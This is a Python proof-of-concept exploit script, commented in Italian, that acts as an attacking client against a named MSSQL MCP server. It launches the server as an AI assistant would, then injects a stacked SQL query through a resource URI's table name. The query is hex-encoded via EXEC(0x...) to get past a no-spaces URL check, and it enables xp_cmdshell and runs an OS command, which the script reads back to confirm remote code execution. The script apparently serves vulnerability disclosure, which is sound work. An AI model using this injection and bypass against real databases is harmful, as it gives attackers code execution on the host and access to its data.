"""
Client MCP "attaccante" per la PoC su JexinSam/mssql_mcp_server.

Avvia il server VULNERABILE (codice originale, NON modificato) come sottoprocesso
via stdio - esattamente come farebbe un AI assistant - e poi:

  [1] legge mssql://products/data         -> uso LECITO del tool (read table)
  [2] legge un URI MALEVOLO                -> il "nome tabella" contiene una
      stacked query. Il server costruisce:
          SELECT TOP 100 * FROM products;EXEC(0x....)--
      e pyodbc/MSSQL eseguono ENTRAMBI gli statement.
      Vincolo: pydantic.AnyUrl rifiuta gli spazi nell'URI -> aggiriamo con la
      tecnica EXEC(0xHEX) (SQL Server interpreta il varbinary come SQL da eseguire,
      e l'hex non contiene spazi).
      Il payload abilita xp_cmdshell ed esegue `whoami`, salvando l'output in pwned.
  [3] rilegge mssql://pwned/data           -> mostra l'output di whoami
      => prova che un endpoint "leggi una tabella" ha ottenuto RCE sul SO.
"""
import asyncio
import os
import sys

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

# --- config DB: stesso MSSQL locale del seeder ---
DB_ENV = {
    "MSSQL_DRIVER":   os.environ.get("MSSQL_DRIVER", "ODBC Driver 18 for SQL Server"),
    "MSSQL_HOST":     os.environ.get("MSSQL_HOST", "localhost"),
    "MSSQL_USER":     os.environ.get("MSSQL_USER", "sa"),
    "MSSQL_PASSWORD": os.environ.get("MSSQL_PASSWORD", "Poc_Str0ng!Pass"),
    "MSSQL_DATABASE": "poc",
    "TrustServerCertificate": "yes",
}

def build_malicious_uri() -> str:
    # SQL "vero" che vogliamo far girare (con spazi: verra' codificato in hex)
    inner = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
             "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
             "INSERT INTO pwned EXEC xp_cmdshell 'whoami'")
    hexsql = "0x" + inner.encode("utf-16-le").hex()   # nessuno spazio nell'hex
    # parts[0] del server = tutto fino al primo '/': "products;EXEC(0x..)--"
    return f"mssql://products;EXEC({hexsql})--/data"

async def main():
    params = StdioServerParameters(
        command=sys.executable,
        args=["-c", "import mssql_mcp_server; mssql_mcp_server.main()"],
        env={**os.environ, **DB_ENV},
    )
    async with stdio_client(params) as (r, w):
        async with ClientSession(r, w) as s:
            await s.initialize()

            print("\n[1] LECITO  -> read_resource('mssql://products/data')")
            res = await s.read_resource("mssql://products/data")
            print("    " + res.contents[0].text.replace("\n", "\n    "))

            print("\n[2] ATTACCO -> read_resource(URI con stacked query in nome tabella)")
            uri = build_malicious_uri()
            print("    URI (troncato): " + uri[:78] + "...")
            try:
                res = await s.read_resource(uri)
                print("    primo result set restituito (tabella products):")
                print("    " + res.contents[0].text.replace("\n", "\n    "))
            except Exception as e:
                print("    (il server ha sollevato un errore sul result set, ma la "
                      "stacked query e' gia' stata eseguita lato server): " + str(e)[:120])

            print("\n[3] VERIFICA -> read_resource('mssql://pwned/data')")
            res = await s.read_resource("mssql://pwned/data")
            out = res.contents[0].text.strip()
            print("    " + out.replace("\n", "\n    "))
            print("\n=> Se sopra vedi l'output di `whoami` (es. utente del container),")
            print("   un endpoint nato per 'leggere una tabella' ha eseguito comandi SO. RCE confermata.")

if __name__ == "__main__":
    asyncio.run(main())
